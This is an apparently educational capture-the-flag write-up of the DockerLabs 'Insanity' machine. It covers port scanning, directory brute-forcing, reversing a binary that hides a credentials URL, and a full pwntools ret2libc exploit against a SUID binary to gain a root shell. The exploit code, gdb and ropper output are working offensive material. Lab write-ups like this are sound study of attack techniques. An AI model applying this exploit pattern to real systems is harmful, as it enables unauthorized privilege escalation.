![Screenshot](/hard/Insanity/Images/machine.png)

Difficulty: **Hard**

Made by: **maciiii__**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

## 🛠️  Techniques: Enumeration with gobuster, analyzing a compiled binary with ghidra, creating our own exploit to get access a URL and retrieve credentials, privilege escalation using ret2libc

---

First of all we make sure that the machine is up, we can check it quickly with the command **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.228 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.082 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.134 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2029ms
rtt min/avg/max/mdev = 0.082/0.148/0.228/0.060 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

We always start with **nmap** to know what ports are open in the target machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-12 15:53 -0500
Initiating ARP Ping Scan at 15:53
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:53, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:53
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:53, 2.65s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2026-01-12 15:53:25 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.06 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once the scan concludes we can see 2 ports open:

- port 22 (ssh / Secure Shell)
- port 80 (http / Hyper-Text Transfer Protocol)

But we need to know more about these ports, like what versions and services are running, we can use once again **nmap** to discover this by us.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/hard/Insanity/Images/image1.png)

As we can see is way more pretty and readable to the sight.

And we can see that the port 80 is a website, and is trying to redirect us to **insanity.dl**.

So this is applying virtual hosting, and we need to put that domain into the **/etc/hosts** file

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ head -n1 /etc/hosts
172.17.0.2      insanity.dl
```

Okay so im going to use **whatweb** to know what technologies uses this website, this is useful to try to find vulnerable versions on the page.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ whatweb http://insanity.dl
http://insanity.dl [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Title[Apache2 Debian Default Page: It works]
```

And we can see that uses apache, but nothing else interesting.

So let's open the website with our browser.

![Screenshot](/hard/Insanity/Images/image2.png)

We can see that is a default page, we can try to take a look into the source code of this page with **CTRL + U**

```r
<!-- Subdominio?? -->
<!-- Tal vez fuzzing??? -->
<!-- O capaz ninguno... -->
```

We can see this comments, probably we need to use some fuzzing on this website.

---
# Enumeration

After a long time doing enumeration with **gobuster** we can only find something interesting in the big list of Discovery in **SecLists**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ gobuster dir -u http://insanity.dl -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://insanity.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 315] [--> http://insanity.dl/javascript/]
/server-status        (Status: 403) [Size: 276]
/tinyp                (Status: 301) [Size: 310] [--> http://insanity.dl/tinyp/]
Progress: 1273830 / 1273830 (100.00%)
===============================================================
Finished
===============================================================
```

We find **tinyp** on the website, let's take a look with the browser.

![Screenshot](/hard/Insanity/Images/image3.png)

We can see these 2 files, so let's download it.

Great, we can see the type of file of these files with the command **file**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/files]
└─$ file secret 
secret: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7fea577c19494e6f2007cafb058b4a6a83db0ebc, for GNU/Linux 4.4.0, not stripped
```

Okay now, let's try to do some reversing with **Ghidra**

---
# Exploitation

After a little bit of analysis from the binary **secret** it seems that is using **libcredenciales.so**

We can do the same with this library, and analyze it with **Ghidra**

After a little bit of analysis to this library, it uses 3 functions (g, b, a) that are very important.

The function **G** is the following one:

```c
void g(void)

{
  long in_FS_OFFSET;
  undefined1 auStack_528 [40];
  undefined8 uStack_500;
  undefined4 local_4f4;
  undefined8 local_4f0;
  undefined1 *local_4e8;
  char *file;
.........
  local_440 = 0xb;
  local_43c = 0xd;
  local_438 = 1;
  local_4f4 = 0x29;
  local_4f0 = 0x29;
  local_4e8 = auStack_528;
  b(&local_4d8,0x29,auStack_528);
  file = "2334645634646.txt";
  snprintf(all_command,0x200,"%s/%s",local_4e8,"2334645634646.txt");
  snprintf(command,0x200,"wget \'%s\'",all_command);
  system(command);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    uStack_500 = 0x1014c5;
    __stack_chk_fail();
  }
  return;
}
```

With this function G are passing a variable, that is very long to the function **B**, and after all of that the system executes a **command**  that uses wget, and a file.

- **wget ???/2334645634646.txt**

It seems that is downloading a file from the website, now let's see what it does the function **B**

```c
void b(long param_1,int param_2,long param_3)

{
  undefined1 final_maybe;
  undefined4 i;
  
  for (i = 0; i < param_2; i = i + 1) {
    final_maybe = a(*(undefined4 *)(param_1 + (long)i * 4));
    *(undefined1 *)(i + param_3) = final_maybe;
  }
  *(undefined1 *)(param_3 + param_2) = 0;
  return;
}
```

This function **B** it receives an array and pass every item of the array to the function **A**

```c
int a(int param_1)

{
  if ((param_1 < 1) || (0x1a < param_1)) {
    if (param_1 == 0x1b) {
                    /* This replaces to : */
      param_1 = 0x3a;
    }
    else if (param_1 == 0x1c) {
                    /* This replaces to / */
      param_1 = 0x2f;
    }
    else if (param_1 == 0x1d) {
                    /* This replaces to . */
      param_1 = 0x2e;
    }
    else if (param_1 == 0x1e) {
                    /* This replaces to _ */
      param_1 = 0x5f;
    }
    else {
                    /* This replaces to ? */
      param_1 = 0x3f;
    }
  }
  else {
    param_1 = param_1 + 0x60;
  }
  return param_1;
}
```

The function **A** receives a parameter that is a **int** value, just a number, and then returns the value of the **param_1** in a hex value, specially characters like you see in the comments, this seems is being a URL or something like that.

So in resume all of these functions does this:

the **G** function pass an array to the function **B** and this function get every item of the array  and then pass a item to the function **A** and this function treats the item received and depending of the number of this item is being replaced to a character, and after doing all of these it seems that we receive a complete **URL** and then the function **G** download the content from a file, with **wget** from this new **URL**.

you might wonder what the array is.

Is from this variable: **local_4d8** <- This is the array, and all of his values continue to: **local_438**

We can use **Ghidra** to convert these hexadecimal numbers to common decimal numbers.

```r
  local_4d8 = 8;
  local_4d4 = 20;
  local_4d0 = 20;
  local_4cc = 16;
  local_4c8 = 27;
  local_4c4 = 28;
  local_4c0 = 28;
  local_4bc = 9;
  local_4b8 = 14;
  local_4b4 = 19;
  local_4b0 = 1;
  local_4ac = 14;
  local_4a8 = 9;
  local_4a4 = 20;
  local_4a0 = 25;
  local_49c = 29;
  local_498 = 4;
  local_494 = 12;
  local_490 = 28;
  local_48c = 21;
  local_488 = 12;
  local_484 = 20;
  local_480 = 18;
  local_47c = 1;
  local_478 = 30;
  local_474 = 19;
  local_470 = 5;
  local_46c = 3;
  local_468 = 18;
  local_464 = 5;
  local_460 = 20;
  local_45c = 30;
  local_458 = 6;
  local_454 = 15;
  local_450 = 12;
  local_44c = 4;
  local_448 = 5;
  local_444 = 18;
  local_440 = 11;
  local_43c = 13;
  local_438 = 1;
```

This is all the array and his items, we can use this and save it to a file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/exploits]
└─$ cat all_nums | awk '{print $3}' | tr -d ';' | sponge all_nums
```

this command only show the numbers and delete the **;** and save it once again to the same file.

Okay Im going to make a script with python to show us the final URL.

```python
def a(param_1):
	if param_1 < 1 or 0x1a < param_1:
		if param_1 == 0x1b:
			param_1 = 0x3a
    
		elif param_1 == 0x1c:
			param_1 = 0x2f
    
		elif param_1 == 0x1d:
			param_1 = 0x2e
    
		elif param_1 == 0x1e:
			param_1 = 0x5f
    
		else:
			param_1 = 0x3f
    
	else:
	    param_1 = param_1 + 0x60
  
	return param_1

def b(all_nums):
	final = ""

	for num in all_nums: final += chr(a(num))

	print(f"[!] URL -> {final}")

if __name__ == "__main__":
	all_nums = []

	with open("all_nums") as file:
        	for line in file: all_nums.append(int(line))

	b(all_nums)
```

To understand better what it does this decoder im going to make a diagram with **excalidraw**

![Screenshot](/hard/Insanity/Images/image4.png)

Okay I hope you can understand it better with this, now, let's use the decoder and see if it works.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/exploits]
└─$ python3 decoder.py 
[!] URL -> http://insanity.dl/ultra_secret_folderkma
```

And we got this url! let's take a look with our browser.

![Screenshot](/hard/Insanity/Images/image5.png)

We can see here a txt file, now let's see what are his content.

```r
Credenciales de ssh

maci:CrACkEd
```

We got the credentials of the user **maci!**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/exploits]
└─$ ssh maci@172.17.0.2         
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:zOTAn0lMEH6FLmjGfiZKtPWMT3yvU1VE4gcdNC/u0AI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
maci@172.17.0.2's password: 
Linux dockerlabs 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 12 23:10:17 2026 from 172.17.0.1
maci@dockerlabs:~$
```

We are in!

---
# Privilege Escalation

After a little bit of time we can see that exists a file that have a permission of **SUID**

```r
maci@dockerlabs:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/sudo
/opt/vuln
```

We can see a file **vuln** in the **/opt/** directory, we can see the proprietary of this binary is the user **root**

```r
maci@dockerlabs:~$ ls -l /opt/vuln 
-r-sr-xr-x 1 root root 16080 Jan 21  2025 /opt/vuln
```

Let's run this program and see what happens.

```r
maci@dockerlabs:/opt$ ./vuln 
Escribe tu nombre: craft
```

We only can see this, let's enter a lot of data like hundreds of As

```r
maci@dockerlabs:/opt$ ./vuln 
Escribe tu nombre: AAAAAAAAAAAAAAAAAAAAAAAAA....
Segmentation fault
```

We can see a Buffer Overflow, let's try to download this binary to our attack machine, making the server with **python** and downloading it with **wget**

```r
maci@dockerlabs:/opt$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Okay now let's download the binary **vuln**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/files]
└─$ wget http://172.17.0.2:100/vuln
--2026-01-12 18:18:45--  http://172.17.0.2:100/vuln
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16080 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                                                        100%[==================================================>]  15.70K  --.-KB/s    in 0s      

2026-01-12 18:18:45 (309 MB/s) - ‘vuln’ saved [16080/16080]
```

Now let's run this program in our system with **gdb** to see more what happens in low level

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/files]
└─$ gdb -q vuln 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
Reading symbols from vuln...
(No debugging symbols found in vuln)
```

Okay now let's run the program with just simply typing **R**

```r
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/insanity/files/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Escribe tu nombre: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....
```

Now let's enter a lot of As and see what happen.

And we can see this:

![Screenshot](/hard/Insanity/Images/image6.png)

We can see that we overwrite other registers in this binary, making a overflow in the buffer.

We can see what protections are using this binary with **checksec**

```r
gef➤  checksec
[+] checksec for '/home/craft/challenges/dockerlabs/dificil/insanity/files/vuln'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

We can see that only NX (Not Executable) protection is activated this mean that we can't execute shellcode in the stack.

So we need to make a exploit with **ret2libc**, we need to know the addresses of the command **system** in the binary, **sh** to obtain a shell, **pop rdi** to insert the sh string into this register.

This technique is basically redirect the flow of the program to execute functions in the C library **libc**, such as system.

So we are "executing" code without injecting shellcode, is just telling the program what to do and by consequence we receive a shell as the user **root** if you remember the proprietary of this binary.

And we need to use gadgets as I tell before (pop rdi) to insert the string of **sh** and let system execute this string.

But before doing that we need to make sure what kind of **ASLR** (Address Space Layout Randomization) is using this machine.

Exists 3 states in ASLR that can be configured.

- 0 (Disabled, no randomization in the memory)
- 1 (Parcial Randomization, Randomize shared libraries, stack, etc...)
- 2 (Full Randomization, all the addresses can be completely random)

To check what it uses this system we can check it in the target machine in the file **randomize_va_space** this show us the number that is using this system.

```r
maci@dockerlabs:/opt$ cat /proc/sys/kernel/randomize_va_space 
0
```

We can see that is 0, so is completely disabled, this mean that all the addresses are going to be static.

So we need to make a python exploit to get a shell as the user root, we can check if in the target machine is installed the library **pwntools**.

```r
maci@dockerlabs:/opt$ python3
Python 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>
```

And we can see that pwntools is on the system.

So now we can start making our exploit and extract all the necessary things.

We need to get the offset of **RSP** and lead the flow of the program, we can use patterns to get the offset of this register, im using **gef**, is like a plugin for **GDB**, you can install it [here](https://github.com/hugsy/gef)

```r
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaa.....
[+] Saved as '$_gef0'
```

Let's copy this string and run once again the binary, and enter all of this.

![Screenshot](/hard/Insanity/Images/image7.png)

Now we can get the offset of **RSP** with the next command:

```r
gef➤  pattern offset $rsp
[+] Searching for '7261616161616161'/'6161616161616172' with period=8
[+] Found at offset 136 (little-endian search) likely
```

We found the offset of **RSP** is **136**

To know the address of the gadget **pop rdi** we can use **ropper**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/files]
└─$ ropper --file vuln --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: vuln
0x000000000040116a: pop rdi; nop; pop rbp; ret;
```

We found the address of the **pop rdi** and also a **pop rbp** this is important to know we can fill it with a null byte and in the pop rdi enter the address of the sh string.

Now, let's find the system function address, we can use in the target machine **gdb** so we need to only do this:

```r
maci@dockerlabs:/opt$ gdb -q vuln 
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) b *main
Breakpoint 1 at 0x40118a
```

Let's make a **breakpoint** in the main function to pause the program when the binary calls the function **main**.

Now let's run the program

```r
(gdb) r
Starting program: /opt/vuln 
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x000000000040118a in main ()
```

And to find system is just doing this:

```r
(gdb) p system
$1 = {int (const char *)} 0x7ffff7e27490 <__libc_system>
```

And we found the address of system.

And to find the address of the string **/bin/sh** is a little bit different.

```r
(gdb) find &system,+9999999,"/bin/sh"
0x7ffff7f71031
warning: Unable to access 16000 bytes of target memory at 0x7ffff7fbb3b9, halting search.
1 pattern found.
```

Great so we got the address of **/bin/sh** if you want to check it, you can enter the next command:

```r
(gdb) x/s 0x7ffff7f71031
0x7ffff7f71031: "/bin/sh"
```

Okay we got all the necessary so we can make our own exploit with **pwntools**.

```python
from pwn import *

def exploit():
    load = ELF("/opt/vuln")
    prc = process("/opt/vuln")

    offset = 136
    
    # 0x000000000040116a: pop rdi; nop; pop rbp; ret;
    # 0x7ffff7e27490: system
    # 0x7ffff7f71031: /bin/sh

    pop_rdi = p64(0x40116a)
    sys_addr = p64(0x7ffff7e27490)
    sh_addr = p64(0x7ffff7f71031)
    null = p64(0x0)

    payload = b"A"*offset + pop_rdi + sh_addr + null + sys_addr

    prc.sendafter(b"nombre: ", payload)
    prc.interactive()

if __name__ == "__main__":
    exploit()
```

I'm going to make a diagram with **excalidraw** once again to understand it better what it does this exploit.

![Screenshot](/hard/Insanity/Images/image8.png)

Okay so we transfer this exploit to the target machine with **scp** because we have the password of the user **maci**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/exploits]
└─$ scp exploit.py maci@172.17.0.2:/tmp
maci@172.17.0.2's password: 
exploit.py
```

We transfer the file to the **/tmp/** directory.

So now let's execute the exploit.

```r
maci@dockerlabs:/tmp$ python3 exploit.py 
[*] '/opt/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/opt/vuln': pid 161
[*] Switching to interactive mode
$ 
$ id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(maci)
$ whoami
root
```

We are root now! ***...pwned..!***
